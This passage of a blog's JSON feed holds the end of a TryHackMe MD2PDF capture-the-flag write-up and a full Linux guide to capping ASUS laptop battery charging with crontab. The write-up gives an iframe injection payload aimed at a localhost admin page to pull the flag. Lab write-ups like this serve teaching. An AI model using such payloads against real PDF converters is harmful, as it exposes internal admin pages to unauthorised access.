anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*wjFmdtFBiB6hNEQjeYbJ1Q.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"364\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"05d0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Copy this payload &amp; paste it. Then tap on the ‘Convert to PDF’ button.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"ff25\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-title.class\">Payload</span>: &lt;iframe src=\"http://localhost:5000/admin\" width=\"1000\" height=\"2000\"&gt;</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*WYsDb15y6dEfAQeiOrb11g.png\" alt=\"TryHackMe MD2PDF writeup &amp; solve &amp; flag.\" width=\"700\" height=\"270\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"4131\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Bang……! We got our flag!!!!</p>\n<p id=\"d210\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Thanks for Reading!!</strong></p>\n<p id=\"caaa\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Follow me on Twitter</strong>: <a class=\"af rn\" href=\"https://twitter.com/sakibulalikhan\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://twitter.com/sakibulalikhan</a></p>\n<p id=\"a415\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Happy MD2PDF~</strong></p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "TryHackMe",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:37:35+06:00",
            "date_modified": "2024-01-07T10:37:35+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html",
            "url": "https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html",
            "title": "How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux",
            "summary": "Nowadays Asus laptops have a preinstalled program called Asus Battery Health Charging. In recent laptops, this feature is integrated into the MyAsus application. Using this feature users can&hellip;",
            "content_html": "<div class=\"fp tp tq tr ts\">\n<div class=\"ab cm\">\n<div class=\"gv bg gw gx gy gz\">\n<p id=\"9494\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Nowadays Asus laptops have a preinstalled program called <strong class=\"ly kz\">Asus Battery Health Charging</strong>. In recent laptops, this feature is integrated into the <strong class=\"ly kz\">MyAsus</strong> application. Using this feature users can set the charging threshold to 60% when they use it on AC power. A laptop will maintain a 60% charge when connected to AC power. This feature reduces laptop heating and improves performance. But, most important of all, it extends the life of the laptop battery.</p>\n<p id=\"3cc8\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Although it’s a great feature to have, it is limited to <strong class=\"ly kz\">Windows OS</strong> only. So, users who want to shift to <strong class=\"ly kz\">Linux OS</strong> (like <strong class=\"ly kz\">Ubuntu</strong>, <strong class=\"ly kz\">Linux</strong> <strong class=\"ly kz\">Mint</strong>, <strong class=\"ly kz\">Elementary OS</strong>, <strong class=\"ly kz\">Pop OS,</strong> etc.) for better performance or due to other reasons will face a great disappointment. In a way, it will discourage users to use <strong class=\"ly kz\">Linux</strong> on their <strong class=\"ly kz\">Asus Laptops</strong>.</p>\n<p id=\"6598\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Even though there is no official support by Asus for Linux Operating Systems, there is an easy way to enable <strong class=\"ly kz\">Asus Battery Health Charging</strong> or in common language <strong class=\"ly kz\">battery charging threshold</strong> in Linux operating systems. In this post, I will be discussing the whole process to enable the same.</p>\n<p id=\"209a\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">However, as a side note, this method will work on most the Linux-based OS’s and has been tested on the latest versions of <strong class=\"ly kz\">Ubuntu</strong> and other <strong class=\"ly kz\">Ubuntu-based OS</strong> (Kubuntu, Lubuntu, Xubuntu, etc.), <strong class=\"ly kz\">Linux Mint</strong>, <strong class=\"ly kz\">PopOS</strong>, <strong class=\"ly kz\">Elementary OS,</strong> and <strong class=\"ly kz\">Zorin OS</strong>.</p>\n</div>\n</div>\n</div>\n<div class=\"ab cm aku anc nx and\" role=\"separator\"> </div>\n<div class=\"fp tp tq tr ts\">\n<div class=\"ab cm\">\n<div class=\"gv bg gw gx gy gz\">\n<h2 id=\"1573\" class=\"zn zf tu be zg zo anh zq ld zr ani zt lh zu anj zw zx zy ank aba abb abc anl abe abf abg bj\">So, Let’s begin our journey</h2>\n<p id=\"32a0\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\">Firstly make sure that your system is up to date. If not sure, then try running this command in the terminal:</p>\n<pre class=\"yq yr ys yt yu abx abp aby abz ax gf bj\"><span id=\"542a\" class=\"ze zf tu abp b fr aca acb l acc acd\" data-selectable-paragraph=\"\">sudo apt-get update &amp;&amp; upgrade -y</span></pre>\n<p id=\"4418\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Let’s start by figuring out the battery name for your ASUS laptop. This can be done by using the following command:</p>\n<pre class=\"yq yr ys yt yu abx abp aby abz ax gf bj\"><span id=\"8f50\" class=\"ze zf tu abp b fr aca acb l acc acd\" data-selectable-paragraph=\"\">ls /sys/class/power_supply</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anm\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*R8yHmhBQMGAdPtwZU0MUxA.png\" alt=\"\" width=\"700\" height=\"194\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"018c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">We can change the value by simply running the following command in the terminal:</p>\n<h4 id=\"e832\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\">For laptops with BAT0:</h4>\n<pre class=\"yq yr ys yt yu abx abp aby abz ax gf bj\"><span id=\"40a7\" class=\"ze zf tu abp b fr aca acb l acc acd\" data-selectable-paragraph=\"\">echo 60 | sudo tee /sys/class/power_supply/BAT0/charge_control_end_threshold</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km ann\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*2rGPkDlit3Y8I9rdi5cVYQ.png\" alt=\"\" width=\"700\" height=\"137\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"5ca2\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">This method works but, <strong class=\"ly kz\">it is not a permanent solution</strong> as it will revert back to its default value i.e. 100 after reboot. So, you have to run this command every time the laptop restarts.</p>\n<p id=\"d353\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">So we move to the next step to make it permanent.</p>\n<h4 id=\"f94d\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\">Now try to make permanent</h4>\n<p id=\"bbee\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\">So, to make it permanent we have to run this command at every startup. To achieve that we have to add this command to the <strong class=\"ly kz\"><em class=\"abt\">/etc/crontab</em></strong> file. (In Linux, using <strong class=\"ly kz\">crontab</strong> we can run different activities at different instances. In this case, we shall run the command at reboot.)</p>\n<p id=\"ac5d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">To edit the <strong class=\"ly kz\">‘crontab’</strong> file run the following command in the terminal:</p>\n<pre class=\"yq yr ys yt yu abx abp aby abz ax gf bj\"><span id=\"5f40\" class=\"ze zf tu abp b fr aca acb l acc acd\" data-selectable-paragraph=\"\">sudo nano /etc/crontab</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km ano\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*F3fttIjAIqyA2sdRsUzbSw.png\" alt=\"\" width=\"700\" height=\"319\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"bcf7\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now add the following lines at the end of the <strong class=\"ly kz\">crontab</strong> file:</p>\n<h4 id=\"e99d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\"><strong>For BAT0:</strong></h4>\n<pre class=\"yq yr ys yt yu abx abp aby abz ax gf bj\"><span id=\"ce27\" class=\"ze zf tu abp b fr aca acb l acc acd\" data-selectable-paragraph=\"\">@reboot root echo 60 &gt; /sys/class/power_supply/BAT0/charge_control_end_threshold</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*crdQP5Ayef9uP40Cvt_3ug.png\" alt=\"\" width=\"700\" height=\"384\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"a1d6\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">(In my case, I did it before. so, I don’t open it with sudo. For this reason, it shows unwriteable. But if you open it with sudo it will writeable.)</p>\n<blockquote class=\"abq abr abs\">\n<p id=\"d72f\" class=\"xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now press “ctrl + x”, then “y” Then “enter”</p>\n</blockquote>\n<p id=\"a217\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">IT makes that file save. Is it saved or not let’s check it:</p>\n<pre class=\"yq yr ys yt yu abx abp aby abz ax gf bj\"><span id=\"f0e5\" class=\"ze zf tu abp b fr aca acb l acc acd\" data-selectable-paragraph=\"\">cat /etc/crontab</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  role=\"presentation\" src=\"https://miro.medium.com/v2/resize:fit:700/1*b13t-rcZbnt2HATvewN2ug.png\" alt=\"\" width=\"700\" height=\"384\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p data-selectable-paragraph=\"\">Now, every time you’ll reboot the laptop, <strong class=\"ly kz\">Asus Battery Health Charging</strong> will be enabled by default. Now you can work on your Linux system without worries.<br><br></p>\n<p id=\"d210\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Thanks for Reading!!</strong></p>\n<p id=\"caaa\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Follow me on Twitter</strong>: <a class=\"af rn\" href=\"https://twitter.com/sakibulalikhan\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://twitter.com/sakibulalikhan</a></p>\n<p id=\"a415\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Happy ASUS Battery Health Charging~</strong></p>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/3/Charge-Threshold-lg.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux"
            ],
            "date_published": "2024-01-07T10:34:41+06:00",
            "date_modified": "2024-01-07T10:34:41+06:00"
        }
    ]
}
